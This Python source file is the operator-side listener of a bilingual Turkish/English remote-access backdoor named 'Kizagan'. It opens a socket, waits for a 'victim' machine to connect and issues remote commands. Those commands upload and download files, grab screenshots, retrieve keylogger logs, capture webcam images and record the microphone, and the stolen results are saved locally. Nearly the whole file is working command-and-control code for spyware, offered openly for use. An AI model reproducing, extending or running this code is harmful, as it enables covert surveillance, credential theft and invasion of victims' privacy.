import socket
import subprocess
import colorama
from colorama import Fore,Back
import os
import simplejson
import base64
import datetime
import random
import time
import argparse
from util import version_control


colorama.init(autoreset=True)


class TR_Dinleyici():
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.Banner_goster()
        dinleyici = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        dinleyici.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        try:
            dinleyici.bind((ip,port))
            dinleyici.listen(0)
        except OSError:
            print(Fore.MAGENTA+"IP ve port numarası yanlış tekrar kontrol edin.")
            exit()
        try:
            print(Back.BLACK + Fore.RED+"[+]Gelecek baglantilar dinlenilmeye baslandi.\n\n")
            (self.baglanti,adres) = dinleyici.accept()
        except KeyboardInterrupt:
            print(Fore.RED+"[-]CTRL+C algılandı.Çıkılıyor...")
            exit()
        print(Fore.GREEN+"[!]Kurban baglantisi geldi :" + str(adres)+"\n\n")
        self.Mikrofon_kaydetme_Sorusu()
        time.sleep(2)
        self.Banner_goster()
        print(Fore.RED+"Komutlar için 'yardim' yaziniz.")

    def renk_ve_yazi_sec(self):
        yazi1 = """

                ██╗░░██╗██╗███████╗░█████╗░░██████╗░░█████╗░███╗░░██╗
                ██║░██╔╝██║╚════██║██╔══██╗██╔════╝░██╔══██╗████╗░██║
                █████═╝░██║░░███╔═╝███████║██║░░██╗░███████║██╔██╗██║
                ██╔═██╗░██║██╔══╝░░██╔══██║██║░░╚██╗██╔══██║██║╚████║
                ██║░╚██╗██║███████╗██║░░██║╚██████╔╝██║░░██║██║░╚███║
                ╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""
        yazi2 = """
                __  __     __     ______     ______     ______     ______     __   __    
                /\ \/ /    /\ \   /\___  \   /\  __ \   /\  ___\   /\  __ \   /\ "-.\ \   
                \ \  _"-.  \ \ \  \/_/  /__  \ \  __ \  \ \ \__ \  \ \  __ \  \ \ \-.  \  
                 \ \_\ \_\  \ \_\   /\_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_\\"\_\ 
                  \/_/\/_/   \/_/   \/_____/   \/_/\/_/   \/_____/   \/_/\/_/   \/_/ \/_/ 

                        """
        yazi3 = """
                888    d8P  8888888 8888888888P        d8888  .d8888b.         d8888 888b    888 
                888   d8P     888         d88P        d88888 d88P  Y88b       d88888 8888b   888 
                888  d8P      888        d88P        d88P888 888    888      d88P888 88888b  888 
                888d88K       888       d88P        d88P 888 888            d88P 888 888Y88b 888 
                8888888b      888      d88P        d88P  888 888  88888    d88P  888 888 Y88b888 
                888  Y88b     888     d88P        d88P   888 888    888   d88P   888 888  Y88888 
                888   Y88b    888    d88P        d8888888888 Y88b  d88P  d8888888888 888   Y8888 
                888    Y88b 8888888 d8888888888 d88P     888  "Y8888P88 d88P     888 888    Y888 """
        yazi4 = """
                  _  _______ ______         _____          _   _ 
                 | |/ /_   _|___  /   /\   / ____|   /\   | \ | |
                 | ' /  | |    / /   /  \ | |  __   /  \  |  \| |
                 |  <   | |   / /   / /\ \| | |_ | / /\ \ | . ` |
                 | . \ _| |_ / /__ / ____ \ |__| |/ ____ \| |\  |
                 |_|\_\_____/_____/_/    \_\_____/_/    \_\_| \_|                                 
                        """
        yazi5 = """
                $$\   $$\ $$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ 
                $$ | $$  |\_$$  _|\____$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |
                $$ |$$  /   $$ |      $$  / $$ /  $$ |$$ /  \__|$$ /  $$ |$$$$\ $$ |
                $$$$$  /    $$ |     $$  /  $$$$$$$$ |$$ |$$$$\ $$$$$$$$ |$$ $$\$$ |
                $$  $$<     $$ |    $$  /   $$  __$$ |$$ |\_$$ |$$  __$$ |$$ \$$$$ |
                $$ |\$$\    $$ |   $$  /    $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |
                $$ | \$$\ $$$$$$\ $$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ |  $$ |$$ | \$$ |
                \__|  \__|\______|\________|\__|  \__| \______/ \__|  \__|\__|  \__|


                                                                                 """
        kirmizi = Fore.RED
        yesil = Fore.GREEN
        mavi = Fore.BLUE
        sari = Fore.YELLOW
        acik_mavi = Fore.CYAN
        mor = Fore.MAGENTA
        yazilar = [yazi1, yazi2, yazi3, yazi4, yazi5]
        renkler = [kirmizi, yesil, mavi, sari, acik_mavi, mor]
        yazi_secimi = random.choice(yazilar)
        renk_secimi = random.choice(renkler)
        return yazi_secimi,renk_secimi

    def Banner_goster(self):
        os.system("clear")
        yazi,renk = self.renk_ve_yazi_sec()
        print(renk+yazi)
        time.sleep(1)
        yazi,renk = self.renk_ve_yazi_sec()
        print(Fore.YELLOW + "\nAvrupa Hunlarının Savaş Tanrısı.\n")
        print(renk+"\t\t\t\t\t\tYazarı : Yiğit Aydemir\n\n\n\n")
        time.sleep(0.5)

    def Mikrofon_kaydetme_Sorusu(self):
        print(Fore.RED + "[?]Kurban bilgisayarın mikrofununu kaydetmek ister misin?(Eğer mikrofonu kaydedersen,backdoor daha çok kurban bilgisayarın RAM'ını harcayacak.)(E/H)")
        mikrofon_secimi = input(Fore.GREEN + "Seçim?(E/H) :")
        if mikrofon_secimi == "E" or mikrofon_secimi == "e":
            self.Json_Gonder(mikrofon_secimi)
            self.Json_Al()
        elif mikrofon_secimi == "H" or mikrofon_secimi == "h":
            self.Json_Gonder(mikrofon_secimi)
            self.Json_Al()
        else:
            print(Fore.YELLOW+"[-]Yanlış seçim.Lütfen tekrar seçin.")
            time.sleep(2)
            self.Mikrofon_kaydetme_Sorusu()

    def Json_Gonder(self,bilgi):
        json_bilgisi = simplejson.dumps(bilgi)
        self.baglanti.send(json_bilgisi.encode("utf-8"))
    def Json_Al(self):
        json_bilgisi = ""
        while True:
            try:
                json_bilgisi = json_bilgisi + self.baglanti.recv(100000).decode()
                return simplejson.loads(json_bilgisi)
            except ValueError:
                continue
    def Komut_Calistir(self,komut):
        self.Json_Gonder(komut)
        if komut[0] == "cikis":
            self.baglanti.close()
            exit()
        return self.Json_Al()


    def Dosya_Kaydet(self,yol,icerik):
        with open(yol,"wb") as dosya:
            dosya.write(base64.b64decode(icerik))
            if command_input[0] == "ekran_goruntusu":
                return Fore.MAGENTA+"[+]Ekran goruntusu şuan durduğunuz dizine kaydedildi."
            elif command_input[0] == "kg_kaydet":
                return Fore.MAGENTA+"[+]Keylogger dosyasi şuan durduğunuz dizine kaydedildi."
            elif command_input[0] == "kamera_goruntusu_al":
                return Fore.MAGENTA+"[+]Kurbanin kamera goruntusu şuan durduğunuz dizine kaydedildi."
            elif command_input[0] == "ses_kayit_indir":
                return Fore.MAGENTA+"[+]Kurbanın ses kaydı şuan durduğunuz dizine kaydedildi."
            else:
                return Fore.MAGENTA+"[+]Dosya şuan durduğunuz dizine indirildi."
    def Dosya_Icerigi_Al(self,yol):
        with open(yol,"rb") as dosya:
            return base64.b64encode(dosya.read())
    def Temizle(self):
        return os.system("clear")
    def Dosya_Tarih_Al(self):
        tarih = datetime.datetime.now()
        tarihli_dosya = str(tarih.hour) + ":" + str(tarih.minute) + ":" + str(tarih.second) + " "
        return tarihli_dosya
    def Yardim(self):
        with open("menus/menuTR.txt","r",encoding="utf-8") as menu:
            return Fore.GREEN+menu.read()
    def Sohbet(self):
        subprocess.Popen(["xterm", "-T", "Chat", "-hold", "-e", "python", "util/chat_listener.py"])

    def Dinleyici_Basla(self):
        while True:
            global command_input
            print(Fore.RED+"<<<<<Konsol@kurban>>>>>")
            command_input = input(Fore.BLUE + "        ╰──------>Komut:")
            command_input = command_input.split(" ")

            try:
                if command_input[0] == "yukle":
                    dosya_icerigi = self.Dosya_Icerigi_Al(command_input[1])
                    command_input.append(dosya_icerigi)
                elif command_input[0] == "sohbet":
                    komut_cikisi = self.Sohbet()
                komut_cikisi = self.Komut_Calistir(command_input)

                if command_input[0] == "indir" and "Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir." not in command_input:
                    komut_cikisi = self.Dosya_Kaydet(command_input[1], komut_cikisi)
                elif command_input[0] == "temizle":
                    komut_cikisi = self.Temizle()
                elif command_input[0] == "yardim":
                    komut_cikisi = self.Yardim()
                elif command_input[0] == "ekran_goruntusu":
                    komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_ekran_goruntusu.png",komut_cikisi)
                elif command_input[0] == "kg_kaydet":
                    komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurbanin_keylogu.txt",komut_cikisi)
                elif command_input[0] == "kamera_goruntusu_al":
                    komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_kamera_goruntusu.png",komut_cikisi)
                elif command_input[0] == "ses_kayit_indir":
                    komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_mikrofon_kaydi.wav",komut_cikisi)
            except Exception:
                print(Back.BLACK+Fore.YELLOW+"Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir.")
            print(komut_cikisi)




class EN_Listener():
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.Show_Banner()
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind((ip, port))
            listener.listen(0)
        except OSError:
            print(Fore.MAGENTA + "Wrong IP or port number please try again.")
            exit()
        try:
            print(Back.BLACK + Fore.RED + "[+]Listening incoming connections.\n\n")
            (self.connection, self.address) = listener.accept()
        except KeyboardInterrupt:
            print(Fore.RED+"[-]CTRL+C detected.Exiting...")
            exit()
        print(Fore.GREEN + "[!]A victim connection came :" + str(self.address) + "\n\n")
        time.sleep(2)
        self.Mic_Record_Question()
        time.sleep(2)
        self.Show_Banner()
        print(Fore.RED + "For commands,use 'help' command.")

    def choose_color_and_text(self):
        text1 = """

                ██╗░░██╗██╗███████╗░█████╗░░██████╗░░█████╗░███╗░░██╗
                ██║░██╔╝██║╚════██║██╔══██╗██╔════╝░██╔══██╗████╗░██║
                █████═╝░██║░░███╔═╝███████║██║░░██╗░███████║██╔██╗██║
                ██╔═██╗░██║██╔══╝░░██╔══██║██║░░╚██╗██╔══██║██║╚████║
                ██║░╚██╗██║███████╗██║░░██║╚██████╔╝██║░░██║██║░╚███║
                ╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""
        text2 = """
                __  __     __     ______     ______     ______     ______     __   __    
                /\ \/ /    /\ \   /\___  \   /\  __ \   /\  ___\   /\  __ \   /\ "-.\ \   
                \ \  _"-.  \ \ \  \/_/  /__  \ \  __ \  \ \ \__ \  \ \  __ \  \ \ \-.  \  
                 \ \_\ \_\  \ \_\   /\_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_\\"\_\ 
                  \/_/\/_/   \/_/   \/_____/   \/_/\/_/   \/_____/   \/_/\/_/   \/_/ \/_/ 

                        """
        text3 = """
                888    d8P  8888888 8888888888P        d8888  .d8888b.         d8888 888b    888 
                888   d8P     888         d88P        d88888 d88P  Y88b       d88888 8888b   888 
                888  d8P      888        d88P        d88P888 888    888      d88P888 88888b  888 
                888d88K       888       d88P        d88P 888 888            d88P 888 888Y88b 888 
                8888888b      888      d88P        d88P  888 888  88888    d88P  888 888 Y88b888 
                888  Y88b     888     d88P        d88P   888 888    888   d88P   888 888  Y88888 
                888   Y88b    888    d88P        d8888888888 Y88b  d88P  d8888888888 888   Y8888 
                888    Y88b 8888888 d8888888888 d88P     888  "Y8888P88 d88P     888 888    Y888 """
        text4 = """
                  _  _______ ______         _____          _   _ 
                 | |/ /_   _|___  /   /\   / ____|   /\   | \ | |
                 | ' /  | |    / /   /  \ | |  __   /  \  |  \| |
                 |  <   | |   / /   / /\ \| | |_ | / /\ \ | . ` |
                 | . \ _| |_ / /__ / ____ \ |__| |/ ____ \| |\  |
                 |_|\_\_____/_____/_/    \_\_____/_/    \_\_| \_|                                 
                        """
        text5 = """
                $$\   $$\ $$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ 
                $$ | $$  |\_$$  _|\____$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |
                $$ |$$  /   $$ |      $$  / $$ /  $$ |$$ /  \__|$$ /  $$ |$$$$\ $$ |
                $$$$$  /    $$ |     $$  /  $$$$$$$$ |$$ |$$$$\ $$$$$$$$ |$$ $$\$$ |
                $$  $$<     $$ |    $$  /   $$  __$$ |$$ |\_$$ |$$  __$$ |$$ \$$$$ |
                $$ |\$$\    $$ |   $$  /    $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |
                $$ | \$$\ $$$$$$\ $$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ |  $$ |$$ | \$$ |
                \__|  \__|\______|\________|\__|  \__| \______/ \__|  \__|\__|  \__|


                                                                                 """
        red = Fore.RED
        green = Fore.GREEN
        blue = Fore.BLUE
        yellow = Fore.YELLOW
        cyan = Fore.CYAN
        magenta = Fore.MAGENTA
        texts = [text1, text2, text3, text4, text5]
        colors = [red, green, blue, yellow, cyan, magenta]
        text_choose = random.choice(texts)
        color_choose = random.choice(colors)
        return text_choose, color_choose

    def Show_Banner(self):
        os.system("clear")
        text, color = self.choose_color_and_text()
        print(color + text)
        time.sleep(1)
        text, color = self.choose_color_and_text()
        print(Fore.YELLOW + "\nGod of War of European Huns.\n")
        print(color + "\t\t\t\t\t\tAuthor : Yiğit Aydemir\n\n\n\n")
        time.sleep(0.5)

    def Mic_Record_Question(self):
        print(Fore.RED + "[?]Do you want to record victim's microphone?(If you record microphone,backdoor will consume more RAM of victim.)(Y/N)")
        mic_choice = input(Fore.GREEN + "Choice?(Y/N) :")
        if mic_choice == "Y" or mic_choice == "y":
            self.Send_Json(mic_choice)
            self.Get_Json()
        elif mic_choice == "N" or mic_choice == "n":
            self.Send_Json(mic_choice)
            self.Get_Json()
        else:
            print(Fore.YELLOW+"[-]Wrong choice.Please choose again.")
            time.sleep(2)
            self.Mic_Record_Question()
    def Send_Json(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def Get_Json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(100000).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def Execute_Command(self, command):
        self.Send_Json(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.Get_Json()

    def Save_File(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            if command_input[0] == "get_ss":
                return Fore.MAGENTA + "[+]Screenshot saved current directory."
            elif command_input[0] == "save_kg":
                return Fore.MAGENTA + "[+]Keylogger file saved current directory."
            elif command_input[0] == "get_camera_image":
                return Fore.MAGENTA + "[+]Victim's camera image saved current directory."
            elif command_input[0] == "download_sound_recording":
                return Fore.MAGENTA + "[+]Victim's microphone recording saved current directory."
            else:
                return Fore.MAGENTA + "[+]The file saved current directory."

    def Get_File_Contents(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def Clear(self):
        return os.system("clear")

    def Get_File_Date(self):
        date = datetime.datetime.now()
        date_file = str(date.hour) + ":" + str(date.minute) + ":" + str(date.second) + " "
        return date_file
    def Help(self):
        with open("menus/menuEN.txt","r") as menu:
            return Fore.LIGHTGREEN_EX+menu.read()

    def Chat(self):
        subprocess.Popen(["xterm","-T","Chat","-hold","-e","python","util/chat_listener.py"])
    def Start_Listener(self):
        while True:
            global command_input
            print(Fore.RED + "<<<<<Console@victim>>>>>")
            command_input = input(Fore.BLUE + "╰──------>Command:")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    file_content = self.Get_File_Contents(command_input[1])
                    command_input.append(file_content)
                elif command_input[0] == "chat":
                    command_output = self.Chat()

                command_output = self.Execute_Command(command_input)

                if command_input[0] == "download" and "The command could not be applied.The victim may disconnected." not in command_input:
                    command_output = self.Save_File(command_input[1], command_output)
                elif command_input[0] == "clear":
                    command_output = self.Clear()
                elif command_input[0] == "help":
                    command_output = self.Help()
                elif command_input[0] == "get_ss":
                    command_output = self.Save_File(self.Get_File_Date() + "victim_ss.png", command_output)
                elif command_input[0] == "save_kg":
                    command_output = self.Save_File(self.Get_File_Date() + "victims_keylog.txt", command_output)
                elif command_input[0] == "get_camera_image":
                    command_output = self.Save_File(self.Get_File_Date() + "victims_camera_image.png",command_output)
                elif command_input[0] == "download_sound_recording":
                    command_output = self.Save_File(self.Get_File_Date() + "victims_microphone_sound.wav", command_output)

            except Exception:
                print(Back.BLACK + Fore.YELLOW + "The command could not be applied.The victim may disconnected.")
            print(command_output)

class Main_Start():
    def __init__(self):
        self.ap = argparse.ArgumentParser()
        self.ap.add_argument("-ip", "--ip_address", required=True,help="Enter the IP address to listen/tr:Dinlemek istediğiniz IP adresini giriniz")
        self.ap.add_argument("-p", "--port", required=True,help="Enter port to listen/tr:Dinlemek istediğiniz portu giriniz")
        self.args = vars(self.ap.parse_args())
        language = self.Language_Choice()
        self.Update_Question(language)
        self.connection_value = ""
    def Language_Choice(self):
        self.choice = ""
        os.system("clear")
        print(Fore.RED + "Dil seciniz/Choose Language :\n\ntr:Türkçe\nen:English")
        self.choice = input(Fore.BLUE + "Choice/Seciminiz:")
        if self.choice == "tr" or self.choice == "en":
            return self.choice
        else:
            print(Fore.YELLOW+"[+]You choosed a wrong language.Please choose again./Yanlış dil seçtiniz.Lütfen tekrar seçiniz.")
            time.sleep(2)
            return self.Language_Choice()
    def Update(self,language):
        version_control.Update()
        if language == "tr":
            print(Fore.BLUE+"[+]Güncelleme yapıldı.Güncellenmiş dosyanız = 'updated_kizagan' artık onu kullanin.")
        else:
            print(Fore.BLUE+"[+]Update completed.You can use 'updated_kizagan' directory now.")

    def Update_Question(self,language):
        try:
            guncelleme_var_mi = version_control.Is_Update_Avaliable()
            if guncelleme_var_mi:
                if language == "tr":
                    self.connection_value = "TR"
                    self.dinleyici = TR_Dinleyici(self.args["ip_address"], int(self.args["port"]))
                    self.dinleyici.Dinleyici_Basla()
                else:
                    self.connection_value = "EN"
                    self.listener = EN_Listener(self.args["ip_address"],int(self.args["port"]))
                    self.listener.Start_Listener()
            else:
                if language == "tr":
                    print(Fore.RED + "[!]Güncelleme mevcut.İndirmek ve kurmak ister misiniz?(E/H)")
                    guncelleme_cevap = input(Fore.MAGENTA + "Guncelleme yapilsin? :")
                    if guncelleme_cevap == "E" or guncelleme_cevap == "e":
                        self.Update("tr")
                    elif guncelleme_cevap == "H" or guncelleme_cevap == "h":
                        print(Fore.GREEN+"[+]Güncelleme yapılmayacak.Listener başlatılıyor...")
                        time.sleep(1)
                        self.connection_value = "TR"
                        self.dinleyici = TR_Dinleyici(self.args["ip_address"], int(self.args["port"]))
                        self.dinleyici.Dinleyici_Basla()
                    else:
                        print(Fore.LIGHTRED_EX+"[-]Yanlış seçim.Lütfen tekrar seçiniz.")
                        self.Update_Question("tr")
                elif language == "en":
                    print(Fore.RED+"[!]An update avaliable.Do you want to download?(Y/N)")
                    update_answer = input(Fore.MAGENTA+"Make an update? :")
                    if update_answer == "Y" or update_answer == "y":
                        self.Update("en")
                    elif update_answer == "N" or update_answer == "n":
                        print(Fore.GREEN+"[+]Update will not be applied.Starting listener...")
                        time.sleep(1)
                        self.connection_value = "EN"
                        self.listener = EN_Listener(self.args["ip_address"],int(self.args["port"]))
                        self.listener.Start_Listener()
                    else:
                        print(Fore.LIGHTRED_EX+"[-]Wrong choice.Please choose again.")
                        self.Update_Question("en")
        except KeyboardInterrupt:
            if self.connection_value == "TR":
                print(Fore.RED+"[+]CTRL+C algılandı.Çıkış yapılıyor...")
                exit()
            else:
                print(Fore.RED+"[+]CTRL+C detected.Exiting...")
                exit()

start = Main_Start()
